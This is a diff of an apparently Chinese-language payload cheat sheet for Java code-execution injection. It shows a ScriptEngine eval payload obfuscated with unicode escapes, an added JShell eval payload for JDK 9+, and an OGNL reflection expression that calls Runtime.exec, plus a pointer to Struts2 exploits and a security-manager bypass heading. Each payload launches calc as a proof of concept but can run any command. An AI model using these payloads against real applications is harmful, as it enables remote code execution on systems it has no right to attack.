@@ -3,7 +3,11 @@
 new javax.script.ScriptEngineManager().getEngineByName("js").eval(此处的Payload可以进行unicode编码)
 
 new javax.script.ScriptEngineManager().getEngineByName("js").eval("new j\u0061va.lang.ProcessBuilder['(java.l\u0061ng.String[])'](['cmd.exe','/c','calc']).start()\u003B");
+可参考s2的exp
+jdk9+
+@jdk.jshell.Jshell@create().eval('code');
 
+${(#cls = #this.getClass().forName("java.lang.Runtime")).(#rt=#cls.getDeclaredMethod("getRuntime",null).invoke(null,null)).(#exec=#cls.getDeclaredMethod("exec", this.getClass().forName("[Ljava.lang.String;"))).(#exec.invoke(#rt,"calc".split(",")))}
 ```
 ## bypass sm
 参考 js的bypass
